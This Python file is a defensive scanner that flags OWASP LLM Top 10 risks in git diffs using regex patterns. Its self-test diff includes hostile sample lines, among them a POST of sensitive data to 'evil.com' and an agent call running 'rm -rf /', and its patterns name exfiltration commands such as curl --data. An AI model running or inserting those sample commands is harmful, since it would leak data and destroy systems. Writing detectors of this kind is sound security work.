"""
OWASP LLM Top 10 Security Checks - COMPLETE IMPLEMENTATION
Implements detection patterns for AI-specific security vulnerabilities
"""

import re
from typing import List, Dict

def run_llm_security_rules(diff: str) -> List[Dict]:
    """
    Run OWASP LLM security checks on git diff
    
    Args:
        diff: Git diff content to analyze
        
    Returns:
        List of security issues found
    """
    issues = []
    lines = diff.split('\n')
    
    for line_num, line in enumerate(lines, 1):
        # Only check added lines (lines starting with +)
        if not line.startswith('+'):
            continue
            
        clean_line = line[1:].strip()  # Remove + prefix and whitespace
        
        # Skip empty lines and comments
        if not clean_line or clean_line.startswith('#') or clean_line.startswith('//'):
            continue
            
        # LLM01: Prompt Injection Detection
        llm01_issues = check_llm01_prompt_injection(clean_line, line_num)
        issues.extend(llm01_issues or [])
        
        # LLM02: Insecure Output Handling Detection  
        llm02_issues = check_llm02_insecure_output(clean_line, line_num)
        issues.extend(llm02_issues or [])
        
        # LLM03: Training Data Poisoning / Prompt Leakage Detection
        llm03_issues = check_llm03_prompt_leakage(clean_line, line_num)
        issues.extend(llm03_issues or [])
        
        # LLM04: Model Denial of Service / Unsafe Function Calls
        llm04_issues = check_llm04_unsafe_calls(clean_line, line_num)
        issues.extend(llm04_issues or [])
        
        # LLM05: Supply-Chain Vulnerabilities / Authorization Bypass
        llm05_issues = check_llm05_authz_bypass(clean_line, line_num)
        issues.extend(llm05_issues or [])
        
        # LLM06: Sensitive Information Disclosure / Data Exfiltration  
        llm06_issues = check_llm06_data_exfil(clean_line, line_num)
        issues.extend(llm06_issues or [])
        
        # LLM07: Insecure Plugin Design / DoS Vulnerabilities
        llm07_issues = check_llm07_plugin_dos(clean_line, line_num)
        issues.extend(llm07_issues or [])
        
        # LLM08: Excessive Agency Detection
        llm08_issues = check_llm08_excessive_agency(clean_line, line_num)
        issues.extend(llm08_issues or [])
        
        # LLM09: Overreliance Detection  
        llm09_issues = check_llm09_overreliance(clean_line, line_num)
        issues.extend(llm09_issues or [])
        
        # LLM10: Model Theft Detection
        llm10_issues = check_llm10_model_theft(clean_line, line_num)
        issues.extend(llm10_issues or [])
        
        # Additional security patterns
        general_issues = check_general_security_patterns(clean_line, line_num)
        issues.extend(general_issues or [])
    
    return issues

def check_llm01_prompt_injection(line: str, line_num: int) -> List[Dict]:
    """
    LLM01: Detect potential prompt injection vulnerabilities
    """
    issues = []
    
    # Pattern 1: Template injection markers
    template_patterns = [
        r'\{\{.*\}\}',      # Jinja2-style: {{user_input}}
        r'\$\{.*\}',        # Shell-style: ${user_input}
        r'<.*>',            # XML-style: <user_input>
        r'\[\[.*\]\]',      # Wiki-style: [[user_input]]
    ]
    
    for pattern in template_patterns:
        if re.search(pattern, line):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "high",
                "comment": f"LLM01: Potential prompt injection vector detected - template pattern may allow user input manipulation"
            })
    
    # Pattern 2: Direct string concatenation with user input
    concat_patterns = [
        r'["\'].*\+.*user.*["\']',
        r'["\'].*\+.*input.*["\']',
        r'["\'].*\+.*request.*["\']',
        r'f["\'].*\{.*user.*\}.*["\']',  # f-string with user input
    ]
    
    for pattern in concat_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security", 
                "severity": "high",
                "comment": "LLM01: Direct user input concatenation in prompt - vulnerable to injection attacks"
            })
    
    # Pattern 3: System prompt modification
    system_prompt_patterns = [
        r'system.*=.*\+',
        r'role.*["\']system["\'].*\+',
        r'prompt.*=.*user',
    ]
    
    for pattern in system_prompt_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "critical", 
                "comment": "LLM01: System prompt modification with user input - critical injection risk"
            })
    
    return issues

def check_llm02_insecure_output(line: str, line_num: int) -> List[Dict]:
    """
    LLM02: Detect insecure handling of LLM outputs
    """
    issues = []
    
    # Pattern 1: Direct execution of LLM output
    exec_patterns = [
        r'exec\s*\(\s*.*response.*\)',
        r'eval\s*\(\s*.*response.*\)',
        r'exec\s*\(\s*.*output.*\)',
        r'eval\s*\(\s*.*output.*\)',
        r'subprocess.*\(.*response.*\)',
        r'os\.system\s*\(\s*.*response.*\)',
    ]
    
    for pattern in exec_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "critical",
                "comment": "LLM02: Direct execution of LLM output - extreme code injection risk"
            })
    
    # Pattern 2: Unsafe deserialization of LLM output
    deserial_patterns = [
        r'pickle\.loads\s*\(\s*.*response.*\)',
        r'json\.loads\s*\(\s*.*response.*\)',
        r'yaml\.load\s*\(\s*.*response.*\)',
        r'marshal\.loads\s*\(\s*.*response.*\)',
    ]
    
    for pattern in deserial_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "high",
                "comment": "LLM02: Unsafe deserialization of LLM output - potential remote code execution"
            })
    
    # Pattern 3: SQL query construction with LLM output
    sql_patterns = [
        r'execute\s*\(\s*.*response.*\)',
        r'query\s*=.*response',
        r'SELECT.*\+.*response',
        r'INSERT.*\+.*response',
        r'UPDATE.*\+.*response',
        r'DELETE.*\+.*response',
    ]
    
    for pattern in sql_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "high",
                "comment": "LLM02: SQL query construction with LLM output - SQL injection risk"
            })
    
    # Pattern 4: File operations with LLM output
    file_patterns = [
        r'open\s*\(\s*.*response.*\)',
        r'write\s*\(\s*.*response.*\)',
        r'os\.path\.join\s*\(\s*.*response.*\)',
        r'pathlib.*\(.*response.*\)',
    ]
    
    for pattern in file_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "medium",
                "comment": "LLM02: File operations with LLM output - path traversal risk"
            })
    
    return issues

def check_llm03_prompt_leakage(line: str, line_num: int) -> List[Dict]:
    """
    LLM03: Training Data Poisoning / Prompt Leakage Detection
    """
    issues = []
    
    # Pattern 1: System prompt exposure in logs/prints
    prompt_exposure_patterns = [
        r'print\s*\(\s*.*system.*prompt.*\)',
        r'log.*\(\s*.*system.*prompt.*\)',
        r'console\.log\s*\(\s*.*system.*prompt.*\)',
        r'print\s*\(\s*.*internal.*instruction.*\)',
        r'print\s*\(\s*.*you\s+are\s+a.*\)',
    ]
    
    for pattern in prompt_exposure_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "high",
                "comment": "LLM03: System prompt exposure detected - may leak internal instructions to users"
            })
    
    # Pattern 2: Debug output containing prompts
    debug_patterns = [
        r'debug.*prompt',
        r'trace.*prompt',
        r'verbose.*system',
        r'dump.*prompt',
    ]
    
    for pattern in debug_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "medium",
                "comment": "LLM03: Debug output may expose prompts - ensure production debug is disabled"
            })
    
    return issues

def check_llm04_unsafe_calls(line: str, line_num: int) -> List[Dict]:
    """
    LLM04: Model Denial of Service / Unsafe Function Calls
    """
    issues = []
    
    # Pattern 1: Direct system command execution
    system_call_patterns = [
        r'subprocess\.call\s*\(',
        r'subprocess\.run\s*\(',
        r'subprocess\.Popen\s*\(',
        r'os\.system\s*\(',
        r'os\.popen\s*\(',
        r'os\.spawn\w+\s*\(',
        r'commands\.getoutput\s*\(',
    ]
    
    for pattern in system_call_patterns:
        if re.search(pattern, line):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "critical",
                "comment": "LLM04: Direct system command execution - high risk for DoS and RCE attacks"
            })
    
    # Pattern 2: Dynamic code execution
    dynamic_exec_patterns = [
        r'\beval\s*\(',
        r'\bexec\s*\(',
        r'compile\s*\(',
        r'__import__\s*\(',
        r'globals\s*\(\)',
        r'locals\s*\(\)',
    ]
    
    for pattern in dynamic_exec_patterns:
        if re.search(pattern, line):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "critical",
                "comment": "LLM04: Dynamic code execution detected - vulnerable to injection and DoS"
            })
    
    # Pattern 3: Resource-intensive operations
    resource_intensive_patterns = [
        r'while\s+True\s*:',
        r'for\s+\w+\s+in\s+range\s*\(\s*\d{6,}\s*\)',  # Large loops
        r'time\.sleep\s*\(\s*\d{3,}\s*\)',  # Long sleeps
        r'threading\.Thread\s*\(',
        r'multiprocessing\.',
        r'asyncio\.create_task\s*\(',
    ]
    
    for pattern in resource_intensive_patterns:
        if re.search(pattern, line):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "medium",
                "comment": "LLM04: Resource-intensive operation - potential DoS vector if user-controlled"
            })
    
    return issues

def check_llm05_authz_bypass(line: str, line_num: int) -> List[Dict]:
    """
    LLM05: Supply-Chain Vulnerabilities / Authorization Bypass Detection
    """
    issues = []
    
    # Pattern 1: Authorization bypass attempts
    authz_bypass_patterns = [
        r'role\s*=\s*["\']admin["\']',
        r'role\s*=\s*["\']root["\']',
        r'is_admin\s*=\s*True',
        r'bypass.*auth',
        r'skip.*permission',
        r'ignore.*role',
        r'override.*access',
    ]
    
    for pattern in authz_bypass_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "high",
                "comment": "LLM05: Authorization bypass attempt detected - hardcoded admin privileges"
            })
    
    # Pattern 2: Dangerous supply chain imports
    dangerous_imports = [
        r'from\s+\w+\s+import\s+\*',  # Wildcard imports
        r'__import__\s*\(\s*["\'][^"\']*["\'].*\)',  # Dynamic imports
        r'importlib\.import_module\s*\(',
        r'pip\.main\s*\(',  # Runtime pip installs
        r'subprocess.*pip\s+install',
    ]
    
    for pattern in dangerous_imports:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security", 
                "severity": "medium",
                "comment": "LLM05: Supply chain vulnerability - unsafe import or dynamic dependency loading"
            })
    
    return issues

def check_llm06_data_exfil(line: str, line_num: int) -> List[Dict]:
    """
    LLM06: Sensitive Information Disclosure / Data Exfiltration Detection
    """
    issues = []
    
    # Pattern 1: Data exfiltration via external requests
    exfil_patterns = [
        r'requests\.post\s*\(\s*["\']http[^"\']*["\'].*data',
        r'urllib\.request.*urlopen.*data',
        r'curl.*--data',
        r'wget.*--post-data',
    ]
    
    for pattern in exfil_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "high",
                "comment": "LLM06: Potential data exfiltration - external POST request with data"
            })
    
    # Pattern 2: Sensitive data exposure in logs
    log_exposure_patterns = [
        r'log.*password',
        r'print.*password',
        r'console\.log.*password',
        r'log.*secret',
        r'print.*token',
        r'log.*api.*key',
    ]
    
    for pattern in log_exposure_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "high", 
                "comment": "LLM06: Sensitive data exposure in logs - potential information disclosure"
            })
    
    return issues

def check_llm07_plugin_dos(line: str, line_num: int) -> List[Dict]:
    """
    LLM07: Insecure Plugin Design / DoS Vulnerabilities Detection
    """
    issues = []
    
    # Pattern 1: Resource exhaustion attacks
    resource_exhaustion = [
        r'while\s+True\s*:',  # Infinite loops
        r'for\s+\w+\s+in\s+range\s*\(\s*(?:\d{7,}|\w+\s*\*\s*\w+)\s*\)',  # Very large loops
        r'time\.sleep\s*\(\s*(?:\d{4,}|\w+\s*\*\s*\w+)\s*\)',  # Long sleeps
    ]
    
    for pattern in resource_exhaustion:
        if re.search(pattern, line):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "high",
                "comment": "LLM07: Resource exhaustion vulnerability - potential DoS via CPU/time consumption"
            })
    
    # Pattern 2: Insecure plugin loading
    insecure_plugin_patterns = [
        r'importlib\.import_module\s*\(\s*.*user.*\)',
        r'__import__\s*\(\s*.*input.*\)',
        r'exec\s*\(\s*.*plugin.*\)',
        r'eval\s*\(\s*.*plugin.*\)',
    ]
    
    for pattern in insecure_plugin_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "critical",
                "comment": "LLM07: Insecure plugin loading - dynamic code execution with user input"
            })
    
    return issues

def check_llm08_excessive_agency(line: str, line_num: int) -> List[Dict]:
    """
    LLM08: Excessive Agency Detection
    """
    issues = []
    
    # Pattern 1: Unrestricted system access
    excessive_permissions = [
        r'agent.*\.execute_system_command',
        r'ai.*\.run_shell_command',
        r'bot.*\.system\s*\(',
        r'llm.*\.exec\s*\(',
        r'agent.*permissions.*=.*\[\s*["\'].*\*.*["\']',
        r'ai.*\.sudo\s*\(',
        r'agent.*root.*access',
    ]
    
    for pattern in excessive_permissions:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "critical",
                "comment": "LLM08: Excessive agency - AI agent granted unrestricted system access"
            })
    
    # Pattern 2: Financial transaction capabilities
    financial_access = [
        r'agent.*\.transfer_money',
        r'ai.*\.make_payment',
        r'bot.*\.purchase',
        r'llm.*\.buy\s*\(',
        r'agent.*\.credit_card',
        r'ai.*\.bank_transfer',
    ]
    
    for pattern in financial_access:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "critical",
                "comment": "LLM08: Excessive agency - AI agent has financial transaction capabilities"
            })
    
    return issues

def check_llm09_overreliance(line: str, line_num: int) -> List[Dict]:
    """
    LLM09: Overreliance Detection
    """
    issues = []
    
    # Pattern 1: Automatic execution without validation
    auto_execution = [
        r'auto_execute\s*\(\s*ai_response\s*\)',
        r'immediate_action\s*\(\s*llm_output\s*\)',
        r'execute_without_review\s*\(',
        r'auto_approve\s*\(\s*ai.*\)',
        r'bypass_human_review',
        r'skip_validation.*ai',
    ]
    
    for pattern in auto_execution:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "critical",
                "comment": "LLM09: Overreliance - automatic execution of AI output without human validation"
            })
    
    # Pattern 2: Critical decisions based solely on AI
    critical_decisions = [
        r'if\s+ai_says.*:\s*delete',
        r'if\s+llm_recommends.*:\s*approve',
        r'medical_diagnosis\s*=\s*ai_response',
        r'financial_decision\s*=\s*llm_output',
        r'autonomous_mode\s*=\s*True',
        r'human_oversight\s*=\s*False',
    ]
    
    for pattern in critical_decisions:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "critical",
                "comment": "LLM09: Overreliance - critical decisions made solely based on AI output"
            })
    
    return issues

def check_llm10_model_theft(line: str, line_num: int) -> List[Dict]:
    """
    LLM10: Model Theft Detection
    """
    issues = []
    
    # Pattern 1: Model architecture probing
    architecture_probing = [
        r'model\.layers\.',
        r'get_model_architecture',
        r'extract_weights',
        r'model\.parameters\(\)',
        r'model_size\s*\(',
        r'hidden_layers.*count',
        r'model\.config\.',
    ]
    
    for pattern in architecture_probing:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "high",
                "comment": "LLM10: Model theft - attempt to probe model architecture or extract parameters"
            })
    
    # Pattern 2: Training data extraction attempts
    training_data_extraction = [
        r'extract_training_data',
        r'get_training_examples',
        r'memorized_data',
        r'training_set_leak',
        r'dataset_extraction',
    ]
    
    for pattern in training_data_extraction:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "critical",
                "comment": "LLM10: Model theft - attempt to extract training data from model"
            })
    
    # Pattern 3: Model distillation/copying
    model_copying = [
        r'distill_model',
        r'copy_model_behavior',
        r'clone_model',
        r'replicate_model',
        r'model_mimicry',
    ]
    
    for pattern in model_copying:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "critical",
                "comment": "LLM10: Model theft - attempt to distill or copy model behavior"
            })
    
    return issues

def check_general_security_patterns(line: str, line_num: int) -> List[Dict]:
    """
    Additional security patterns beyond OWASP LLM Top 10
    """
    issues = []
    
    # Hardcoded secrets
    secret_patterns = [
        (r'password\s*=\s*["\'][^"\']+["\']', "Hardcoded password detected"),
        (r'api_key\s*=\s*["\'][^"\']+["\']', "Hardcoded API key detected"),
        (r'secret\s*=\s*["\'][^"\']+["\']', "Hardcoded secret detected"),
        (r'token\s*=\s*["\'][^"\']+["\']', "Hardcoded token detected"),
        (r'sk-[a-zA-Z0-9]{32,}', "OpenAI API key detected"),
    ]
    
    for pattern, message in secret_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "critical",
                "comment": f"Security: {message} - use environment variables instead"
            })
    
    # Unsafe imports
    unsafe_imports = [
        (r'import\s+pickle', "Pickle module can execute arbitrary code"),
        (r'from\s+pickle\s+import', "Pickle module can execute arbitrary code"),
        (r'import\s+marshal', "Marshal module can execute arbitrary code"),
    ]
    
    for pattern, message in unsafe_imports:
        if re.search(pattern, line):
            issues.append({
                "line": line_num,
                "type": "security",
                "severity": "medium",
                "comment": f"Security: {message}"
            })
    
    return issues

# Test function
if __name__ == "__main__":
    test_diff = """
+ password = "hardcoded123"
+ user_prompt = f"You are helpful. {user_input}"
+ exec(ai_response)
+ query = "SELECT * FROM users WHERE name = " + ai_output
+ import pickle
+ print(f"System prompt: {system_prompt}")
+ subprocess.run(user_command)
+ eval(dynamic_code)
+ while True:
+     time.sleep(1000)
+ role = "admin"
+ requests.post("http://evil.com", data=sensitive_data)
+ agent.execute_system_command("rm -rf /")
+ auto_execute(ai_response)
+ extract_training_data(model)
"""
    
    issues = run_llm_security_rules(test_diff)
    print(f"Found {len(issues)} security issues:")
    for issue in issues:
        print(f"  Line {issue['line']} ({issue['severity']}): {issue['comment']}")